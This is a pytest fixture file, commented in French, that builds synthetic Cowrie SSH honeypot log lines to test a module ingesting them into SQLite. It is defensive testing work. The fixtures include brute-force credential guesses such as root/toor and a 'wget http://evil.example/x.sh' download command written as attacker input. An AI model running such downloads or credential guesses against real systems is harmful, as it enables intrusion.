import json

import pytest

import ingest

A, B = "203.0.113.10", "198.51.100.7"


def _ev(ts, eventid, session, ip, **extra):
    d = {"eventid": eventid, **extra, "sensor": "test", "timestamp": ts, "src_ip": ip, "session": session}
    return json.dumps(d)


LINES = [
    # Attaquant A : connexion, login réussi, commandes, téléchargement
    _ev("2026-10-30T10:00:00.000000Z", "cowrie.session.connect", "sA", A, src_port=4242, protocol="ssh"),
    _ev("2026-10-30T10:00:00.100000Z", "cowrie.client.version", "sA", A, version="SSH-2.0-libssh_0.9.6"),
    _ev("2026-10-30T10:00:01.000000Z", "cowrie.login.failed", "sA", A, username="root", password="123456"),
    _ev("2026-10-30T10:00:02.000000Z", "cowrie.login.failed", "sA", A, username="admin", password="admin"),
    _ev("2026-10-30T10:00:03.000000Z", "cowrie.login.success", "sA", A, username="root", password="toor"),
    _ev("2026-10-30T10:00:04.000000Z", "cowrie.command.input", "sA", A, input="uname -a"),
    _ev("2026-10-30T10:00:05.000000Z", "cowrie.command.input", "sA", A, input="wget http://evil.example/x.sh"),
    _ev("2026-10-30T10:00:06.000000Z", "cowrie.session.file_download", "sA", A,
        url="http://evil.example/x.sh", shasum="ab" * 32),
    _ev("2026-10-30T10:00:07.000000Z", "cowrie.session.closed", "sA", A, duration=6.5),
    # Attaquant B : un seul essai raté, le lendemain
    _ev("2026-10-31T11:00:00.000000Z", "cowrie.session.connect", "sB", B, src_port=5151, protocol="ssh"),
    _ev("2026-10-31T11:00:00.100000Z", "cowrie.client.version", "sB", B, version="SSH-2.0-Go"),
    _ev("2026-10-31T11:00:01.000000Z", "cowrie.login.failed", "sB", B, username="root", password="123456"),
    _ev("2026-10-31T11:00:02.000000Z", "cowrie.session.closed", "sB", B, duration=1.0),
    # Lignes à ignorer ou à rejeter
    "",
    "ceci n'est pas du JSON",
    json.dumps({"timestamp": "2026-10-31T12:00:00.000000Z"}),  # pas d'eventid
]


@pytest.fixture
def cowrie_log(tmp_path):
    path = tmp_path / "cowrie.json"
    path.write_text("\n".join(LINES) + "\n", encoding="utf-8")
    return path


@pytest.fixture
def db_path(tmp_path, cowrie_log):
    path = tmp_path / "honeypot.db"
    conn = ingest.connect(path)
    ingest.ingest_file(conn, cowrie_log)
    conn.close()
    return path
